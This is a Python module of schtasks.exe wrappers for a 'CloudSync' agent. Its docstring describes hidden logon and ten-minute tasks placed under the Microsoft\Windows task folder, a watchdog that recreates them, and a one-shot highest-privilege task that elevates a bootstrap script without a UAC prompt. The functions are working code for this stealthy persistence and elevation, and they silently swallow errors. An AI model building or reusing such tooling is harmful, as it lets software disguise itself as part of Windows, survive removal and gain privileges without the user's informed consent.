"""``schtasks.exe`` wrappers for the CloudSync scheduled tasks.

The agent registers two hidden tasks, both running as the logged-on user:

    Microsoft\\Windows\\CloudSync\\CloudSync        ONLOGON, LIMITED, /IT
    Microsoft\\Windows\\CloudSync\\CloudSyncHealth  MINUTE /MO 10, LIMITED, /IT

The watchdog and the uninstaller delete/query/recreate them, and the silent
elevation path creates a one-shot ``/RL HIGHEST`` task.  This module mirrors
those exact shapes (same switches, same run-as user, same ``/F`` behaviour) and
returns booleans so callers can treat task management as best effort, the way
``controller.py`` did.

Nothing runs at import time.  All functions swallow subprocess failures and
timeouts: False means "not done", not "raise".
"""

from __future__ import annotations

import os
import subprocess
import time

from ..platform import winapi

__all__ = [
    "DEFAULT_TASK_ROOT", "MAIN_TASK", "HEALTH_TASK", "DEFAULT_TASKS",
    "TASK_EXE", "available", "schtasks", "quote_command",
    "create", "create_onlogon", "create_minute", "create_once",
    "query", "exists", "run", "end", "delete", "delete_all", "task_folder",
]

TASK_EXE = "schtasks.exe"
DEFAULT_TASK_ROOT = r"Microsoft\Windows\CloudSync"
MAIN_TASK = DEFAULT_TASK_ROOT + r"\CloudSync"
HEALTH_TASK = DEFAULT_TASK_ROOT + r"\CloudSyncHealth"
DEFAULT_TASKS = (MAIN_TASK, HEALTH_TASK)

# watchdog.ps1 and the health task use these values.
DEFAULT_HEALTH_EVERY_MINUTES = 10


def available():
    """True when schtasks.exe is on PATH (Windows installs)."""
    try:
        from shutil import which
        return which(TASK_EXE) is not None
    except Exception:
        return False


def quote_command(program, *arguments):
    """Build the ``/TR`` command line: ``"prog" "arg" ...``.

    Same shape as the installer and ``register_tasks()``: paths with spaces are
    quoted, which is why the task action works for ``%LOCALAPPDATA%`` paths.
    """
    parts = ['"%s"' % program]
    for argument in arguments:
        parts.append('"%s"' % argument)
    return " ".join(parts)


def schtasks(arguments, timeout=40, capture=False):
    """Run ``schtasks.exe`` with the given argument list.

    Returns a ``subprocess.CompletedProcess`` or None on spawn failure/timeout.
    ``capture`` selects PIPE (for queries) vs DEVNULL (for mutations).
    """
    try:
        return subprocess.run(
            [TASK_EXE] + [str(a) for a in arguments],
            timeout=timeout,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE if capture else subprocess.DEVNULL,
            stderr=subprocess.PIPE if capture else subprocess.DEVNULL,
            creationflags=winapi.creation_flags(),
        )
    except Exception:
        return None


def _ok(arguments, timeout=40):
    result = schtasks(arguments, timeout=timeout)
    return bool(result is not None and result.returncode == 0)


def create(name, command, schedule="ONLOGON", modifier=None, start_time=None,
           run_level="LIMITED", interactive=True, run_as=None, force=True,
           timeout=40):
    """Create (or replace) a scheduled task; True when schtasks succeeded.

    ``command`` is the ``/TR`` value - build it with :func:`quote_command` when
    it is a program plus arguments.  ``schedule`` is any schtasks schedule
    (``ONLOGON``, ``MINUTE``, ``ONCE``, ...); ``modifier`` becomes ``/MO``.
    """
    arguments = ["/Create", "/TN", name, "/TR", command, "/SC", schedule]
    if modifier is not None:
        arguments.extend(["/MO", str(modifier)])
    if start_time is not None:
        arguments.extend(["/ST", str(start_time)])
    if run_level:
        arguments.extend(["/RL", run_level])
    if interactive:
        arguments.append("/IT")
    if force:
        arguments.append("/F")
    if run_as:
        arguments.extend(["/RU", run_as])
    return _ok(arguments, timeout=timeout)


def create_onlogon(name, program, arguments=(), run_as=None,
                   run_level="LIMITED", interactive=True, timeout=40):
    """Logon trigger, same shape as the installer's main task."""
    return create(
        name,
        quote_command(program, *arguments),
        schedule="ONLOGON",
        run_level=run_level,
        interactive=interactive,
        run_as=run_as if run_as is not None else os.environ.get("USERNAME"),
        timeout=timeout,
    )


def create_minute(name, program, arguments=(), every=DEFAULT_HEALTH_EVERY_MINUTES,
                  run_as=None, run_level="LIMITED", interactive=True,
                  timeout=40):
    """Minute-trigger task, same shape as the CloudSyncHealth task."""
    return create(
        name,
        quote_command(program, *arguments),
        schedule="MINUTE",
        modifier=int(every),
        run_level=run_level,
        interactive=interactive,
        run_as=run_as if run_as is not None else os.environ.get("USERNAME"),
        timeout=timeout,
    )


def _once_start_time(delay_seconds=60):
    return time.strftime("%H:%M", time.localtime(time.time() + delay_seconds))


def create_once(name, program, arguments=(), start_time=None,
                run_as=None, run_level="HIGHEST", interactive=False,
                timeout=40):
    """One-shot task, ``/RL HIGHEST`` by default (silent elevation path).

    A task created by an administrator with ``/RL HIGHEST`` runs with the full
    token, which is how the bootstrap script elevates without a UAC prompt.
    """
    return create(
        name,
        quote_command(program, *arguments),
        schedule="ONCE",
        start_time=start_time or _once_start_time(),
        run_level=run_level,
        interactive=interactive,
        run_as=run_as if run_as is not None else os.environ.get("USERNAME"),
        timeout=timeout,
    )


def query(name, timeout=40):
    """Return ``schtasks /Query`` stdout text, or None when the task is absent."""
    result = schtasks(["/Query", "/TN", name], timeout=timeout, capture=True)
    if result is None or result.returncode != 0:
        return None
    return (result.stdout or b"").decode("utf-8", "replace")


def exists(name, timeout=40):
    """True when the task is registered (same probe the watchdog uses)."""
    return query(name, timeout=timeout) is not None


def run(name, timeout=40):
    """Start the task now (``/Run``)."""
    return _ok(["/Run", "/TN", name], timeout=timeout)


def end(name, timeout=40):
    """Stop a running task (``/End``)."""
    return _ok(["/End", "/TN", name], timeout=timeout)


def delete(name, timeout=40):
    """Delete the task (``/Delete /F``); False when it did not exist."""
    return _ok(["/Delete", "/TN", name, "/F"], timeout=timeout)


def delete_all(names, timeout=40):
    """Delete every task in ``names``; returns the number actually deleted."""
    return sum(1 for name in names if delete(name, timeout=timeout))


def task_folder(task_name):
    """Folder part of a task path: ``Microsoft\\Windows\\CloudSync\\CloudSync``
    -> ``Microsoft\\Windows\\CloudSync``."""
    if not task_name:
        return ""
    return task_name.rsplit("\\", 1)[0] if "\\" in task_name else ""
